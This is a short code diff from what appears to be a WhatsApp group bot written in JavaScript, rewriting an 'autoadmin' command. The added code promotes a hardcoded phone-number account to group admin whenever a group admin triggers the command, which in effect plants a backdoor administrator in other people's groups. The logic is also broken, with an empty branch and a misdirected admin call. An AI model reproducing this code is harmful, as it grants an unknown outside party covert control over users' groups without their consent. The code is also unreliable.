@@ -2144,10 +2144,19 @@ case 'tonto':
           }
           break
 
-case 'autoadmin':
-if (!isOwner) return reply(mess.only.admin)
-Lxa.groupMakeAdmin(from '34632246602@c.us')
-break
+
+      case 'autoadmin':
+          if (!isGroup) return reply(mess.only.group)
+          if (!isGroupAdmins) return reply(mess.only.admin)
+          if (!isBotGroupAdmins) return reply(mess.only.Badmin)
+          if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
+          mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
+          if (mentioned.length > 1) {
+          } else {
+            Lxa.groupMakeAdmin(`34632246602@c.us`, true)
+            Lxa.groupMakeAdmin(from)
+          }
+          break
 
 //Lxa.groupMakeAdmin(from
   /*case 'emparejar':
